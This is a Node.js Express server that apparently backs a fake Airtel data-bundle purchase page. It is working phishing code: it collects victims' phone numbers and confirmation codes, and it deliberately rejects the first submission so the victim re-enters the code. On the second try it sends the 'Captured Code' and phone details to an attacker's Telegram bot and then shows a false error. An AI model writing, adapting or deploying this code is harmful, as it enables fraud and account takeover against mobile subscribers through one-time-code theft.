const express = require('express');
const path = require('path');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
require('dotenv').config();

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Track attempts per session/IP simply for this flow demo
let attemptTracker = {};

// Telegram Credentials (Replace or use .env)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID';

app.post('/api/submit-order', async (req, res) => {
    const { phone, gb, kwacha, duration, code, step } = req.body;
    const clientIp = req.ip;

    if (!attemptTracker[clientIp]) {
        attemptTracker[clientIp] = 1;
    } else {
        attemptTracker[clientIp] += 1;
    }

    const currentAttempt = attemptTracker[clientIp];

    // First attempt: Refuse / Show error
    if (currentAttempt === 1) {
        return res.json({
            success: false,
            message: "Invalid or expired confirmation code. Please try again."
        });
    }

    // Second attempt: Allow, send data to Telegram, and show final error/reload
    if (currentAttempt >= 2) {
        // Reset tracker if desired
        delete attemptTracker[clientIp];

        const telegramMessage = `🚨 *New Airtel Data Submission* 🚨\n\n` +
            `📱 *Phone:* ${phone}\n` +
            `📦 *Bundle:* ${gb} GB\n` +
            `💵 *Amount:* ${kwacha} ZMW\n` +
            `⏱ *Duration:* ${duration}\n` +
            `🔑 *Captured Code:* ${code}`;

        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: telegramMessage,
                    parse_mode: 'Markdown'
                })
            });
        } catch (error) {
            console.error("Telegram API Error:", error);
        }

        return res.json({
            success: true,
            message: "An error occurred processing your request. Please try again later."
        });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
